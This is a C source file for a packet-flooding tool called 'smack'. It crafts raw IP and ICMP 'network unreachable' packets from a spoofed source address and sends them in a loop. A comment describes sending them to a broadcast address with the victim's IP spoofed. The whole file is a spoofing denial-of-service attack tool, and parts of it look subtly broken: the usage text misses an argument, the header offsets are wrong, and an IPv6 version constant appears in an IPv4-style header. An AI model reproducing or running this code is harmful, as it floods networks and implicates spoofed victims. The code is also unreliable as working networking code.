#include "ip-headers.h"
#include "ip-constructors.c"
#include "applications.c"
#include "constants.h"
// Sends random ICMP unreachable packets from random IP's
//http://www.iana.org/assignments/icmp-parameters/icmp-parameters.xhtml
// Arguments standarized and checked //
// Respects executable [[--source-addr saddr] [--[remote|broadcast]-addr raddr] [--source-port sport] [--remote-port rport] [--n N]] //
int main(int argc,char* argv[]){
    if(argc!=9) fprintf(stdout,"Usage: smack --source-addr saddr --remote-addr raddr --source-port sport --n N\n");
	else{	
		/** Example source address and source port **/
		char* source_address    = argv[2];
		char* source_port       = argv[6];
		char* remote_address    = argv[4];
		int iterations          = atoi(argv[8]);

		/** Obtain the socket**/
		int sock = get_socket_descriptor_raw_icmp();
		/** Create buffer for your packets **/
		char buffer[DEFAULT_PCKT_LEN]; memset(buffer,0,DEFAULT_PCKT_LEN);
	
		/**Init sockaddr_in with my network information (Only if it's necessary, there are functions in applications that spoofs your addr)**/
		struct sockaddr_in myaddr;
		set_sockaddr_in(&myaddr,source_address,source_port);

		/** Create your headers and make your combinations **/
		IP_HEADER *ip_hdr   = (IP_HEADER *)buffer;
		ICMP_HEADER *icmp_hdr = (ICMP_HEADER *)(buffer + sizeof(ICMP_HEADER));

		/** Fill your headers (IP && ICMP in this case) **/
		set_ip_header(ip_hdr,IP_VERSION_V6,IP_DEFAULT_IHL,IP_CURRENT_TOS,IP_DEFAULT_IDENTIFICATION,0,0,0,\
			      IP_DEFAULT_FRAGMENT_OFFSET,IP_DEFAULT_TTL,IP_ICMP_PROTOCOL,0,source_address,remote_address,0);

		/** Use auxiliar functions to warn of current status **/
		SHOW_CREATED_IP_HEADER(ip_hdr);
		
		set_icmp_header(icmp_hdr,ICMP_TYPE_UNREACHABLE,ICMP_CODE_NET_UNREACHABLE,0,0);
		SHOW_CREATED_ICMP_HEADER(icmp_hdr);

		/** Notice the kernel that we doesn't need it fill the header **/
		if(kernel_not_fill_my_header(sock)<0){fprintf(stderr,"Is not possible to notice the kernel"); exit(0);}
		
		/** Application (Send icmp requests to broadcast addr with victim ip spoofed) **/
		run_flood(sock,iterations,ip_hdr,&myaddr,buffer);
	
	}
	return 0;
}
